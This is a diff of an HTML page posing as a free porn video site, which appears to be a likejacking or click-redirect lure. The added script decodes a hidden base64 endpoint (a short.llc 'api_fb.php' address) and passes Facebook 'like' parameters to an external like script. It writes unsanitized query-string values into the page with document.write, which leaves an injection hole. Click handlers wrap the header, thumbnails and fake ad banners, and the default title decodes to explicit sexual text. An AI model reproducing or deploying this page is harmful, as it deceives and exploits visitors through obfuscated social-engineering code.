@@ -2,29 +2,67 @@
 
 <head>
 	<link rel="shortcut icon" type="image/x-icon" href="https://i.imgur.com/Xfys5a9.png">
-	<link rel="stylesheet" href="https://unruffled-brattain-93efb0.netlify.com/css/style.css?20319" type="text/css">
-	<link rel="stylesheet" href="https://unruffled-brattain-93efb0.netlify.com/css/player.css?20319" type="text/css">
-	<link rel="stylesheet" href="https://unruffled-brattain-93efb0.netlify.com/css/box-fb.css?20319" type="text/css">
-	<script type="text/javascript" src="https://prekerteam.github.io/js/controler.js"></script>
+	<script type="text/javascript">
+		function cmx(txt) {
+			var result = atob(txt);
+			document.write(result);
+		}
+	</script>
+	<link rel="stylesheet" href="css/style.css?20319" type="text/css">
+	<link rel="stylesheet" href="css/player.css?20319" type="text/css">
+	<link rel="stylesheet" href="css/box-fb.css?20319" type="text/css">
+	<script type="text/javascript">
+		function cmx(txt) {
+			var result = atob(txt);
+			document.write(result);
+		}
+	</script>
+	<script type="text/javascript">
+		function cid(name) {
+			return decodeURI(
+				(RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+			);
+		}
+		function decode(txt) {
+			var result = atob(txt);
+			document.write(result);
+		}
+		//var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
+		if (cid("i")) {
+			var img = atob(cid("i"));
+		} else {
+			var img = atob('aHR0cHM6Ly9pLmltZ3VyLmNvbS9BOVdvb1lKLmpwZw');
+		}
+		if (cid("t")) {
+			var ttl = atob(cid("t"));
+		} else {
+			var ttl = atob('U2Fzc3kgR2luYSBpcyBnZXR0aW5nIGZpbmdlcmZ1Y2tlZCBhbmQgZnVja2VkIGluIHRoZSBtaWRkbGUgb2YgYSBuaWNlIGRheS4');
+		}
+		if (cid("s")) {
+			var srv = cid("s");
+		} else {
+			var srv = 'aHR0cHM6Ly9zaG9ydC5sbGMvYXBpX2ZiLnBocA';
+		}
+		if (cid("u")) {
+			var usr = cid("u");
+		} else {
+			var usr = 'Q2VyeHJl';
+		}
+		if (cid("f")) {
+			var fp = cid("f");
+		} else {
+			var fp = 'ZGF0aW5n';
+		}
+		document.write("<title>" + ttl + "</title>");
+		document.write("<link rel='image_src' href='" + img + "' />");
+		document.write("<meta property='og:image' content='" + img + "' />");
+	</script>
 	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
 	<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700" rel="stylesheet">
-	<script src="https://prekerteam.github.io/js/jquery.min.js"></script>
-
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script type="text/javascript" src="https://connect.facebook.net/en_US/all.js#xfbml=1">
-	</script>
-	<script type="text/javascript">
-
-		var img = cmx('aHR0cHM6Ly9pLmltZ3VyLmNvbS9jd0JpaUhkLmpwZw');
-		var ttl = cmx('RnJlZSBPbmxpbmUgVmlkZW8gRG93bmxvYWRlci4gQ2F0Y2ggVmlkZW8gRnJvbSBBbnkgU2l0ZQ');
-		var srv = 'aHR0cHM6Ly9zaG9ydC5sbGMvYXBpX2ZiLnBocA';
-		var usr = 'Q2VyeHJl';
-		var fp = 'ZGF0aW5n';
-		document.write("<title>" + ttl + "</title>");
-		document.write("<link rel='image_src' href='" + img + "' />");
-		document.write("<meta property='og:image' content='" + img + "' />");
-
 	</script>
 	<script type="text/javascript">
 		likes = fp,
@@ -34,22 +72,17 @@
 			tunggu = "0",
 			bahasa = "id",
 			us = usr,
-			hs = cmx(srv)
+			hs = atob(srv)
 	</script>
-	<script type="text/javascript" src="https://prekerteam.github.io/lp_tube1/js/like.js"></script>
-	<script type="text/javascript" src="https://prekerteam.github.io/js/mobile-detect.js"></script>
+	<script type="text/javascript" src="js/like.js"></script>
+	<script type="text/javascript" src="js/mobile-detect.js"></script>
 </head>
 
 <body style="background-color: #191919;">
-	<!-- header menu-->
-	<div id="top">
-
-	</div>
+	<div id="top"></div>
 	<div id="header" onclick="gox()">
-		<a href="#" class="logo"><img src="https://i.imgur.com/C9M0TgJ.png" alt="Logo Page"></a>
-		<div class="addthis_inline_share_toolbox">
-
-		</div>
+		<a href="#" class="logo"><img src="https://i.imgur.com/C9M0TgJ.png" alt="Nasty Video Tube.com"></a>
+		<div class="addthis_inline_share_toolbox"></div>
 		<img class="bookmark" src="https://i.imgur.com/4TVkkso.png" alt="Bookmark us due to regular updates!">
 	</div>
 	<div class="menu-line">
@@ -61,12 +94,10 @@
 			<li><a href="#">Hot Videos</a></li>
 			<li><a href="#">Asian Porn</a></li>
 			<li><a href="#">Indian Porn</a></li>
-		</ul>
 	</div>
 	<div class="title">
 		<h2 class="alignleft">Free Sex Video</h2>
 	</div>
-	<!-- mulai contentt-->
 	<div id="vid-wraper">
 		<div id="vid-container">
 			<div id="vid-vid">
@@ -118,7 +149,6 @@
 				</div>
 			</div>
 		</div>
-		<!-- iklan banner -->
 		<script type="text/javascript">
 			use_go = true;
 			function gox() {
@@ -130,31 +160,30 @@
 				console.log(md.mobile());
 			} else {
 				document.write(`<div id="vid-ads" onclick="gox()">
-			<img src="https://i.imgur.com/EtPqLnQ.jpg" width="300" height="250" scrolling="no" marginwidth="0"
+			<img src="https://i.imgur.com/jRAS1Lp.jpg" width="300" height="260" scrolling="no" marginwidth="0"
 				marginheight="0" frameborder="0">
-			<img src="https://i.imgur.com/NeV3Q5J.png" width="300" height="250" scrolling="no" marginwidth="0"
+			<img src="https://i.imgur.com/wTPHkiW.jpg" width="300" height="260" scrolling="no" marginwidth="0"
 				marginheight="0" frameborder="0">
 		</div>`);
 			}
 		</script>
-		<div style="clear: both;">
-		</div>
-	</div><!-- akhir kontent -->
-	<!-- footer menu-->
+		<div style="clear: both;"></div>
+	</div>
+
 	<div class="title">
 		<h2>Best Tube Sites</h2>
 	</div>
-	<ul class="thumbs site" onclick="gox();">
+	<ul class="thumbs site" onclick="gox()">
 		<li>
-			<div class=" tn">
-				<a href="#">
-					<div class="border">
-						<div class="img">
-							<img src="https://i.imgur.com/3kLEfU4.jpg" class="lazy" alt="Total Porn Tube">
-						</div>
-					</div>Big Tits
-				</a>
-			</div>
+			<div class="tn">
+		<a href="#">
+			<div class="border">
+				<div class="img">
+					<img src="https://i.imgur.com/3kLEfU4.jpg" class="lazy" alt="Total Porn Tube">
+				</div>
+			</div>Big Tits
+		</a>
+		</div>
 		</li>
 		<li>
 			<div class="tn">
